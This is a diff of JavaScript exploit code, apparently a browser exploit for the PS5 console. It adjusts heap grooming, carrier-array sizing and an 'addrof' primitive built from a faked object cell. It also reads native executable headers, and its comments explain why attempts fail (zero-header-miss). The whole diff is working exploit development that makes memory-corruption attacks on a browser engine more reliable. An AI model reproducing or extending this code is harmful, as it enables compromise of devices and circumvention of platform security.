@@ -16,10 +16,10 @@ const HOLDER_BYTES = 0x40;
 const HX1400_LIGHT_CORE =
   new URLSearchParams(location.search).get("hx1400") === "1";
 
-// Heap profile, chosen with ?mem. The default is the heaviest groom of all
-// -- 12 million slots, drain 512, around 130 MB -- and that is where
-// placement-throw and zero-header-miss cluster. Selecting a lighter profile
-// is therefore worth trying when a console keeps missing.
+// Heap profile, chosen with ?mem. Without one the groom uses drain 512 and
+// a carrier that starts small and grows only as far as coverage demands --
+// see CARRIER_CAP below. A fixed profile caps the carrier harder and drains
+// less, which is worth trying when a console keeps missing.
 const HX_MEM_LEVEL = (function () {
   try {
     const q = new URLSearchParams(location.search).get("mem");
@@ -139,13 +139,13 @@ function growCarrier(minSlots) {
 }
 
 // fakeHost becomes a dictionary (three `delete`s), and a dictionary lets the
-// GC rearrange things. Between building it and the critical load there used
-// to sit 65,532 objects, a serialization of this graph, a 96 MB carrier
-// butterfly with its twelve-million write loop and two timer steps. If q2/q3
-// get pushed out of the inline slots along the way, the faked cell's vector
-// and length are 0, every index lies out of bounds, `candidate[i]` is
-// `undefined` -- and that reads back as 0x30 zero bytes: `zero-header-miss`.
-// So fakeHost is built late, right before it is needed.
+// GC rearrange things. Between building it and the critical load sit 65,532
+// objects, a serialization of this graph, the carrier butterfly with its
+// write loop and two timer steps. If q2/q3 get pushed out of the inline
+// slots along the way, the faked cell's vector and length are 0, every index
+// lies out of bounds, `candidate[i]` is `undefined` -- and that reads back as
+// 0x30 zero bytes: `zero-header-miss`. So fakeHost is built late, right
+// before it is needed, and the carrier is allocated ahead of it.
 
 const symbolToString = Symbol.prototype.toString;
 
@@ -867,7 +867,6 @@ function prepareAddrof() {
   getterCarrier[1] = targetHolder;
   getterCarrier[2] = fakeHost;
   getterCarrier[3] = targetHolder;
-  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
 
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
   emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
@@ -883,7 +882,6 @@ function runAddrofCapture() {
     for (let i = 0; i < 16; i++)
       capturedWords[i] = capturedString.charCodeAt(7 + i);
 
-    /* RELEASE_CAPTURED_STRING_EARLY */
     capturedString = null;
 
     captureState = 1;
@@ -1153,9 +1151,6 @@ function loadHistoryCritical() {
     profile.nativeExecType = targetHeader[5];
     profile.nativeExecFlags = targetHeader[6];
 
-    try {
-      globalThis.__ps5NativeCtor = nativeConstructorAddress;
-    } catch (e) {}
     const nativeExecType1 = targetHeader[5];
 
     nativeExecutableHeaderOK =
@@ -1282,7 +1277,6 @@ function runGroomAndLoad() {
     ]);
     loadHistoryCritical();
 
-    /* RELEASE_HISTORY_GRAPH_EARLY */
     outerGraph = null;
     fillerGraph = null;
 
@@ -1360,7 +1354,6 @@ function beginComposition() {
   const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
   const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
-  /* ADDROF_COVERAGE_PATCH */
   const requiredSourceBytes = fakeChars * 2;
   const minimumSlots =
     Math.ceil(requiredSourceBytes / 8);
@@ -1383,7 +1376,7 @@ function beginComposition() {
 
   if (!(repeated && distinct && plausible && sourceCovered)) {
     if (!sourceCovered && growCarrier(minimumSlots))
-      emit("TRAEGER-WACHSEN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+      emit("CARRIER-GROWN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
     finishEarlySafeAttempt(
       "ADDROF-FAIL",
       `repeat=${repeated}-distinct=${distinct}` +
@@ -1393,7 +1386,6 @@ function beginComposition() {
     return;
   }
 
-  /* RELEASE_ADDROF_OBJECTS_EARLY */
   capturedString = null;
   capturedWords = null;
   preparedSymbolObject = null;
